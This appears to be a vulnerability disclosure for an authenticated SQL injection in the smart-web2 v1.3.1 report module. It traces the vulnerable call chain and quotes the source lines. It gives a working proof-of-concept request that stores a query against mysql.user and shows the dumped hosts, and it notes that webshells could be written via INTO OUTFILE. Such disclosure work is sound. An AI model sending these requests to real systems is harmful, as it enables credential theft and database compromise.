# smart-web2 v1.3.1 SQL Injection Vulnerability Report

## Introduction to Vulnerabilities

The report module in the backend of smart-web2 (an open-source Java OA system based on the Spring MVC 4.1.6 + Hibernate 4.2.19 framework) is vulnerable to arbitrary SQL execution. The `sqlResource.sql` parameter is stored in the `t_report_sql_resource` table through the `ReportController.save()` interface and directly embedded into Hibernate native queries without any parameterization or filtering.

The `getDao().queryObjSql()` / `getDao().countSql()` methods of Hibernate accept user-controlled SQL strings, and the direct execution of stored SQL leads to arbitrary SQL injection. The system lacks global SQL filtering, and all user-defined SQL statements are executed directly.

After logging in, the attacker can execute arbitrary SQL statements (SELECT / INSERT / UPDATE / DELETE / DROP), extract database data, read the MySQL system tables, and potentially write WebShells via `INTO OUTFILE`.

---

## Affected Versions

smart-web2 (cn.com.smart:smart-web2) v1.3.1 （latest version）

## Utilize conditions

- After logging in, you can use it (with ordinary user permissions,)

---

## Vulnerability Reproduction

### User parameters enter the call chain of the SQL statement

```
ReportController.save()
  → report.getSqlResource().getSql()        ← 接受用户参数 sqlResource.sql
  → ReportService.saveOrUpdate(report)      ← 传入service层
  → handleSql(sql)                          ← 仅去除换行空格，无过滤
  → t_report_sql_resource 表                ← 恶意 SQL 入库

ReportInstanceService.getDatas()
  → ReportSqlResourceService.getDatas()
  → sqlResource.getSql()                    ← 取出恶意 SQL
  → getDao().queryObjSql(sql, params)       ← 直接执行任意 SQL
```

Create a malicious report and execute SQL to extract MySQL user table:

```
POST /report/save HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

name=mysql_users_report2&type=1&properties.isImport=0&properties.isCheckbox=0&sqlResource.name=mysql_users_sql2&sqlResource.sql=SELECT User,Host,authentication_string FROM
mysql.user&fields[0].title=User&fields[0].sortOrder=1&fields[0].columnName=User
```

return：`HTTP/1.1 200 OK`

![image-20260807154137090](https://github.com/fangtang7/picx-images-hosting/raw/master/smart-web2/image-20260807154137090.3k8q8ggrob.webp)

```
GET /report/instance/list?reportId=R_96ed18ef9c534c5dbc287be010ecfa05 HTTP/1.1
Host: localhost:8080
```

return：

```html
<tr id='t-root' class='tr-selected tr-one-selected'>
<td title="localhost" ...>localhost</td></tr>
<tr id='t-mysql.session' ...>localhost</td></tr>
<tr id='t-mysql.sys' ...>localhost</td></tr>
<tr id='t-app' ...>localhost</td></tr>
<tr id='t-rebuild' ...>localhost</td></tr>
```

![image-20260807154559477](https://github.com/fangtang7/picx-images-hosting/raw/master/smart-web2/image-20260807154559477.41yrx1inrx.webp)

---

## Source Code Analysis

Lines 113-119 of ReportController.java, `@RequestMapping("/save")` receives the user-defined TReport object containing `sqlResource.sql` from HTTP POST parameters without any filtering and directly passes it to the Service

![image-20260807154745394](https://github.com/fangtang7/picx-images-hosting/raw/master/smart-web2/image-20260807154745394.1ow5fu5aqk.webp)

Lines 81-84 of ReportService.java directly save the SQL with only newline cleanup

```java
TReportSqlResource reportSqlRes = report.getSqlResource();
reportSqlRes.setSql(handleSql(reportSqlRes.getSql()));  // ← 仅去换行空格
reportSqlRes.setReportId(report.getId());
reportSqlResServ.save(reportSqlRes);
```

![image-20260807154848067](https://github.com/fangtang7/picx-images-hosting/raw/master/smart-web2/image-20260807154848067.2h90xkmb1f.webp)

Lines 35-41 of ReportSqlResourceService.java directly execute the stored SQL

```java
String sql = sqlResource.getSql();                          // ← 用户控制的 SQL
long totalNum = getDao().countSql(sql, params);             // ← 直接执行 COUNT
List<Object> objs = getDao().queryObjSql(sql, params, start, rows);  // ← 直接执行任意 SQL
```

![image-20260807154920757](https://github.com/fangtang7/picx-images-hosting/raw/master/smart-web2/image-20260807154920757.2yz2m5o1st.webp)
